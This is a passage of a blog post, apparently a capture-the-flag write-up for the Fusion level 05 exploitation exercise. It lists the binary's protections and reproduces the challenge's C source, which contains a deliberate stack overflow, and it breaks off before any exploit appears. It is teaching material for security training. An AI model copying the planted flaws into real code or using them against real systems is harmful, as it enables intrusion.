@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html class="default_colors_property">
+  <base href="/home/tabacco/tech/coding/web/execius.github.io/" target="">
+  <head>
+    <link rel="stylesheet" href="rsc/css/post.css">
+    <link rel="stylesheet" href="rsc/css/code.css">
+    <meta name="description" content="predicting file descriptors, creating format string from buffer overflow, and then some">
+    <title>Execius : Fusion level 05 - barely bypassing PIE</title>
+          
+    <link rel="stylesheet" href="rsc/css/mainstyle.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <meta charset="UTF-8">
+    <meta name="keywords" content="binary exploitation, hacking, pwn, reverse engineering , Execius">
+    <meta name="author" content="Execius">
+
+
+  </head>
+
+  <body>
+          
+    <nav class="bar navbar">
+
+      <div class="home_logo bar_item">
+        <a class="button logo_text"  href="index.html" >Execius</a>
+      </div>
+
+      <div class="categories bar_item">
+        <a class="button" href="./rsc/html/topics/index.html"><i class="fa-solid fa-folder"></i>Topics</a>
+        <a class="button" href="rsc/html/feed/index.html"><i class="fa-solid fa-square-rss"></i>Feed</a>
+        <a class="button" href="rsc/html/resources/index.html"><i class="fa-solid fa-book"></i> resources </a>
+      </div>
+
+    </nav>
+
+
+    <div class="layout">
+      <main class="content">
+
+        <div class="post">
+          <ul>
+<li>playing around with the fusion VM from exploit.education has been fun , I was too lazy  to write writeups for exercices from 0 to 4 , but here we are , bypassing fully protected binaries !</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Setting</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Vulnerability Type</td>
+<td>Stack</td>
+</tr>
+<tr>
+<td>Position Independent Executable</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Read only relocations</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Non-Executable stack</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Non-Executable heap</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Address Space Layout Randomisation</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Source Fortification</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>## Source Code Analysis</td>
+<td></td>
+</tr>
+<tr>
+<td>the code of the challenge is this :</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<div class="codehilite"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&quot;../common/common.c&quot;</span><span class="c1">    </span>
+
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;task.h&gt;</span>
+
+<span class="cp">#define STACK (4096 * 8)</span>
+
+<span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">hash</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">length</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">mask</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">h</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xfee13117</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="n">h</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xfee13117</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">h</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+<span class="w">      </span><span class="n">h</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="p">(</span><span class="n">h</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">11</span><span class="p">);</span>
+<span class="w">      </span><span class="n">h</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="p">(</span><span class="n">h</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">7</span><span class="p">);</span>
+<span class="w">      </span><span class="n">h</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="n">h</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="p">(</span><span class="n">h</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">3</span><span class="p">);</span>
+<span class="w">  </span><span class="n">h</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="p">(</span><span class="n">h</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">10</span><span class="p">);</span>
+<span class="w">  </span><span class="n">h</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="p">(</span><span class="n">h</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="mi">15</span><span class="p">);</span>
+<span class="w">  </span><span class="n">h</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="p">(</span><span class="n">h</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">17</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">h</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">mask</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">fdprintf</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">fmt</span><span class="p">,</span><span class="w"> </span><span class="p">...)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">va_list</span><span class="w"> </span><span class="n">ap</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">va_start</span><span class="p">(</span><span class="n">ap</span><span class="p">,</span><span class="w"> </span><span class="n">fmt</span><span class="p">);</span>
+<span class="w">  </span><span class="n">vasprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="n">fmt</span><span class="p">,</span><span class="w"> </span><span class="n">ap</span><span class="p">);</span>
+<span class="w">  </span><span class="n">va_end</span><span class="p">(</span><span class="n">ap</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">fdwrite</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">msg</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">msg</span><span class="p">));</span><span class="w">    </span>
+<span class="w">      </span><span class="n">free</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">struct</span><span class="w"> </span><span class="nc">registrations</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kt">short</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">flags</span><span class="p">;</span>
+<span class="w">  </span><span class="n">in_addr_t</span><span class="w"> </span><span class="n">ipv4</span><span class="p">;</span>
+<span class="p">}</span><span class="w"> </span><span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">));</span>
+
+<span class="cp">#define REGDB (128)</span>
+<span class="k">struct</span><span class="w"> </span><span class="nc">registrations</span><span class="w"> </span><span class="n">registrations</span><span class="p">[</span><span class="n">REGDB</span><span class="p">];</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">addreg</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">sflags</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">ipv4</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">h</span><span class="p">,</span><span class="w"> </span><span class="n">flags</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">arg</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">line</span><span class="p">;</span>
+<span class="w">  </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39; &#39;</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="n">p</span><span class="p">)</span><span class="w"> </span><span class="k">goto</span><span class="w"> </span><span class="n">bail</span><span class="p">;</span>
+<span class="w">  </span><span class="o">*</span><span class="n">p</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">sflags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">;</span>
+<span class="w">  </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39; &#39;</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="n">p</span><span class="p">)</span><span class="w"> </span><span class="k">goto</span><span class="w"> </span><span class="n">bail</span><span class="p">;</span>
+<span class="w">  </span><span class="o">*</span><span class="n">p</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">ipv4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">sflags</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="o">~</span><span class="mh">0xe0</span><span class="p">)</span><span class="w"> </span><span class="k">goto</span><span class="w"> </span><span class="n">bail</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">h</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hash</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">name</span><span class="p">),</span><span class="w"> </span><span class="n">REGDB</span><span class="mi">-1</span><span class="p">);</span>
+<span class="w">  </span><span class="n">registrations</span><span class="p">[</span><span class="n">h</span><span class="p">].</span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">flags</span><span class="p">;</span>
+<span class="w">  </span><span class="n">registrations</span><span class="p">[</span><span class="n">h</span><span class="p">].</span><span class="n">ipv4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inet_addr</span><span class="p">(</span><span class="n">ipv4</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;registration added successfully</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+
+<span class="nl">bail</span><span class="p">:</span>
+<span class="w">  </span><span class="n">free</span><span class="p">(</span><span class="n">line</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">senddb</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">],</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">host</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">l</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">arg</span><span class="p">);</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">port</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">sz</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buffer</span><span class="p">;</span>
+<span class="w">  </span><span class="n">sz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+<span class="w">  </span><span class="n">host</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">line</span><span class="p">;</span>
+<span class="w">  </span><span class="n">l</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39; &#39;</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="n">l</span><span class="p">)</span><span class="w"> </span><span class="k">goto</span><span class="w"> </span><span class="n">bail</span><span class="p">;</span>
+<span class="w">  </span><span class="o">*</span><span class="n">l</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">  </span><span class="n">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">l</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">port</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">goto</span><span class="w"> </span><span class="n">bail</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;sending db</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">if</span><span class="p">((</span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netdial</span><span class="p">(</span><span class="n">UDP</span><span class="p">,</span><span class="w"> </span><span class="n">host</span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">goto</span><span class="w"> </span><span class="n">bail</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="n">sz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">REGDB</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">registrations</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">flags</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">registrations</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">ipv4</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">memcpy</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">registrations</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">registrations</span><span class="p">));</span>
+<span class="w">          </span><span class="n">p</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">registrations</span><span class="p">);</span>
+<span class="w">          </span><span class="n">sz</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">registrations</span><span class="p">);</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="nl">bail</span><span class="p">:</span>
+<span class="w">  </span><span class="n">fdwrite</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">sz</span><span class="p">);</span>
+<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+<span class="w">  </span><span class="n">free</span><span class="p">(</span><span class="n">line</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">get_and_hash</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">maxsz</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">string</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">separator</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">name</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">maxsz</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">32</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">maxsz</span><span class="p">,</span><span class="w"> </span><span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="p">];</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">separator</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
+<span class="w">      </span><span class="n">name</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">string</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">hash</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">name</span><span class="p">),</span><span class="w"> </span><span class="mh">0x7f</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+<span class="k">struct</span><span class="w"> </span><span class="nc">isuparg</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">string</span><span class="p">;</span>
+<span class="p">};</span>
+
+
+<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">checkname</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">isuparg</span><span class="w"> </span><span class="o">*</span><span class="n">isa</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">isuparg</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">arg</span><span class="p">);</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">h</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">h</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_and_hash</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="w"> </span><span class="n">isa</span><span class="o">-&gt;</span><span class="n">string</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;@&#39;</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">fdprintf</span><span class="p">(</span><span class="n">isa</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;%s is %sindexed already</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">isa</span><span class="o">-&gt;</span><span class="n">string</span><span class="p">,</span><span class="w"> </span><span class="n">registrations</span><span class="p">[</span><span class="n">h</span><span class="p">].</span><span class="n">ipv4</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s">&quot;not &quot;</span><span class="p">);</span>
+
+<span class="p">}</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">isup</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">],</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">host</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">l</span><span class="p">;</span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">isuparg</span><span class="w"> </span><span class="o">*</span><span class="n">isa</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">isuparg</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">arg</span><span class="p">);</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">port</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">sz</span><span class="p">;</span>
+
+<span class="w">  </span><span class="c1">// skip over first arg, get port</span>
+<span class="w">  </span><span class="n">l</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">isa</span><span class="o">-&gt;</span><span class="n">string</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39; &#39;</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="n">l</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>
+<span class="w">  </span><span class="o">*</span><span class="n">l</span><span class="o">++</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">l</span><span class="p">);</span>
+<span class="w">  </span><span class="n">host</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">64</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">128</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="w"> </span><span class="n">registrations</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="n">registrations</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">ipv4</span><span class="p">)</span><span class="w"> </span><span class="k">continue</span><span class="p">;</span>
+
+<span class="w">      </span><span class="n">sprintf</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;%d.%d.%d.%d&quot;</span><span class="p">,</span>
+<span class="w">          </span><span class="p">(</span><span class="n">registrations</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">ipv4</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span>
+<span class="w">          </span><span class="p">(</span><span class="n">registrations</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">ipv4</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span>
+<span class="w">          </span><span class="p">(</span><span class="n">registrations</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">ipv4</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">16</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span>
+<span class="w">          </span><span class="p">(</span><span class="n">registrations</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">ipv4</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">24</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xff</span><span class="p">);</span>
+
+<span class="w">      </span><span class="k">if</span><span class="p">((</span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netdial</span><span class="p">(</span><span class="n">UDP</span><span class="p">,</span><span class="w"> </span><span class="n">host</span><span class="p">,</span><span class="w"> </span><span class="n">port</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">      </span><span class="p">}</span>
+
+<span class="w">      </span><span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xc0</span><span class="p">;</span>
+<span class="w">      </span><span class="n">memcpy</span><span class="p">(</span><span class="n">buffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">registrations</span><span class="p">));</span>
+<span class="w">      </span><span class="n">buffer</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
